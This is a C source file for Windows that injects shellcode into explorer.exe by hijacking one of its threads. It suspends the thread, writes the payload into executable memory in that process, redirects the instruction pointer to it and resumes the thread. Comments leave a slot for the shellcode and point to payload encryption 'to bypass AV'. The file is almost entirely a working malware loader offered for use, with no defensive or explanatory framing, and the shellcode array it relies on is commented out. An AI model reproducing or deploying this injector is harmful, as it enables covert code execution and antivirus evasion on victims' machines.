#include <Windows.h>
#include <tlhelp32.h>
#include <stdio.h>


//
// SHELLCODE HERE
//
// unsigned char* Shellcode[] =
//


// REFER TO PAYLOAD ENCRYPT/DECRYPT TO BYPASS AV


DWORD FindProcessId(const wchar_t* processName) {
    DWORD processId = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(PROCESSENTRY32W);
    if (Process32FirstW(hSnap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, processName) == 0) {
                processId = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
    return processId;
}

DWORD FindThreadInProcess(DWORD processId) {
    THREADENTRY32 te32;
    HANDLE hSnap = INVALID_HANDLE_VALUE;
    DWORD threadId = 0;
    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    te32.dwSize = sizeof(THREADENTRY32);
    if (Thread32First(hSnap, &te32)) {
        do {
            if (te32.th32OwnerProcessID == processId) {
                threadId = te32.th32ThreadID;
                break;
            }
        } while (Thread32Next(hSnap, &te32));
    }
    CloseHandle(hSnap);
    return threadId;
}

BOOL InjectShellcode(DWORD processId, DWORD threadId, const unsigned char* shellcode, SIZE_T shellcodeSize) {

    // 3 OPEN PROCESS
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);

    // 4 OPEN THREAD
    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, threadId);

    // 5 SUSPEND THREAD
    SuspendThread(hThread);

    // 6 GET THREAD CONTEXT
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(hThread, &ctx);

    // 7 ALLOCATE MEMORY
    LPVOID pRemoteCode = VirtualAllocEx(hProcess, NULL, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    // 8 WRITE SHELLCODE TO ALLOCATED MEMORY
    WriteProcessMemory(hProcess, pRemoteCode, shellcode, shellcodeSize, NULL);

    // 9 POINT TO SHELLCODE TO EXECUTE
    ctx.Rip = (DWORD64)pRemoteCode;

    // 10 SET NEW CONTEXT TO THREAD
    SetThreadContext(hThread, &ctx);

    // 11 RESUME THREAD
    ResumeThread(hThread);

    CloseHandle(hProcess);
    CloseHandle(hThread);

    return TRUE;
}

int main() {

    // 1 GET PROCESS ID
    DWORD processId = FindProcessId(L"explorer.exe");

    // 2 GET THREAD ID
    DWORD threadId = FindThreadInProcess(processId);

    InjectShellcode(processId, threadId, Shellcode, sizeof(Shellcode));

    return 0;

}
